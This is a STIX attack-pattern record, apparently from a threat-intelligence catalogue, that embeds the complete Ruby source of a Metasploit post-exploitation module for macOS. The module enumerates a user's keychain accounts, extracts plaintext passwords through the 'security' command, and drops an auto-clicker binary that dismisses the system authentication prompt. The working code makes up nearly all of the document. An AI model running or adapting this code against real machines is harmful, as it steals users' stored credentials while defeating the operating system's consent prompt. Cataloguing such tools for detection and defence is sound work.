{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2928b414-10a2-4985-8d01-b52e46b4b434",
    "created": "2024-08-14T16:33:00.70432Z",
    "modified": "2024-08-14T16:33:00.704324Z",
    "name": "OS X Gather Keychain Enumeration",
    "description": " This module presents a way to quickly go through the current user's keychains and collect data such as email accounts, servers, and other services.  Please note: when using the GETPASS and GETPASS_AUTO_ACCEPT option, the user may see an authentication alert flash briefly on their screen that gets dismissed by a programmatically triggered click.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/enum_keychain.rb",
            "external_id": "enum_keychain.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::OSX::System\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Keychain Enumeration',\n        'Description' => %q{\n          This module presents a way to quickly go through the current user's keychains and\n          collect data such as email accounts, servers, and other services.  Please note:\n          when using the GETPASS and GETPASS_AUTO_ACCEPT option, the user may see an authentication\n          alert flash briefly on their screen that gets dismissed by a programmatically triggered click.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'ipwnstuff <e[at]ipwnstuff.com>', 'joev' ],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('GETPASS', [false, 'Collect passwords.', false]),\n        OptBool.new('GETPASS_AUTO_ACCEPT', [false, 'Attempt to auto-accept any prompts when collecting passwords.', true]),\n        OptInt.new('GETPASS_TIMEOUT', [false, 'Maximum time to wait on all passwords to be dumped.', 999999]),\n        OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])\n      ]\n    )\n  end\n\n  def list_keychains\n    keychains = cmd_exec('security list')\n    user = cmd_exec('whoami')\n    print_status(\"The following keychains for #{user.strip} were found:\")\n    print_line(keychains.chomp)\n    return keychains =~ /No such file or directory/ ? nil : keychains\n  end\n\n  def enum_accounts(_keychains)\n    user = cmd_exec('whoami').chomp\n    out = cmd_exec(\"security dump | egrep 'acct|desc|srvr|svce'\")\n\n    accounts = []\n\n    out.split(\"\\n\").each do |line|\n      next if line =~ /NULL/\n\n      case line\n      when /\"acct\"/\n        accounts << Hash.new\n        accounts.last['acct'] = line.split('<blob>=')[1].split('\"')[1]\n      when /\"srvr\"/\n        accounts.last['srvr'] = line.split('<blob>=')[1].split('\"')[1]\n      when /\"svce\"/\n        accounts.last['svce'] = line.split('<blob>=')[1].split('\"')[1]\n      when /\"desc\"/\n        accounts.last['desc'] = line.split('<blob>=')[1].split('\"')[1]\n      end\n    end\n\n    accounts\n  end\n\n  def get_passwords(accounts)\n    (1..accounts.count).each do |num|\n      if accounts[num].key?('srvr')\n        c = 'find-internet-password'\n        s = accounts[num]['srvr']\n      else\n        c = 'find-generic-password'\n        s = accounts[num]['svce']\n      end\n\n      cmd = cmd_exec(\"security #{c} -ga \\\"#{accounts[num]['acct']}\\\" -s \\\"#{s}\\\" 2>&1\")\n\n      cmd.split(\"\\n\").each do |line|\n        if line =~ /password: /\n          if line.split[1].nil?\n            accounts[num]['pass'] = nil\n          else\n            accounts[num]['pass'] = line.split[1].gsub('\"', '')\n          end\n        end\n      end\n    end\n    return accounts\n  end\n\n  def save(data, kind = 'Keychain information')\n    l = store_loot('macosx.keychain.info',\n                   'plain/text',\n                   session,\n                   data,\n                   'keychain_info.txt',\n                   'Mac Keychain Account/Server/Service/Description')\n\n    print_good(\"#{@peer} - #{kind} saved in #{l}\")\n  end\n\n  def run\n    @peer = \"#{session.session_host}:#{session.session_port}\"\n\n    keychains = list_keychains\n    if keychains.nil?\n      print_error(\"#{@peer} - Module timed out, no keychains found.\")\n      return\n    end\n\n    user = cmd_exec('/usr/bin/whoami').chomp\n    accounts = enum_accounts(keychains)\n    save(accounts)\n\n    if datastore['GETPASS']\n      if datastore['GETPASS_AUTO_ACCEPT']\n        print_status(\"Writing auto-clicker to `#{clicker_file}'\")\n        write_file(clicker_file, clicker_bin)\n        register_file_for_cleanup(clicker_file)\n\n        print_status('Dumping keychain with auto-clicker...')\n        passwords = cmd_exec(\"chmod +x #{clicker_file} && #{clicker_file}\", nil, datastore['GETPASS_TIMEOUT'])\n        save(passwords, 'Plaintext passwords')\n\n        begin\n          count = JSON.parse(passwords).count\n          print_good(\"Successfully stole #{count} passwords\")\n        rescue JSON::ParserError => e\n          print_error('Response was not valid JSON')\n        end\n      else\n        begin\n          passwords = get_passwords(accounts)\n        rescue StandardError\n          print_error(\"#{@peer} - Module timed out, no passwords found.\")\n          print_error(\"#{@peer} - This is likely due to the host not responding to the prompt.\")\n        end\n        save(passwords)\n      end\n    end\n  end\n\n  def clicker_file\n    @clicker_file ||=\n      \"#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\n\n  def clicker_bin\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'osx', 'dump_keychain', 'dump'\n    ))\n  end\n\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}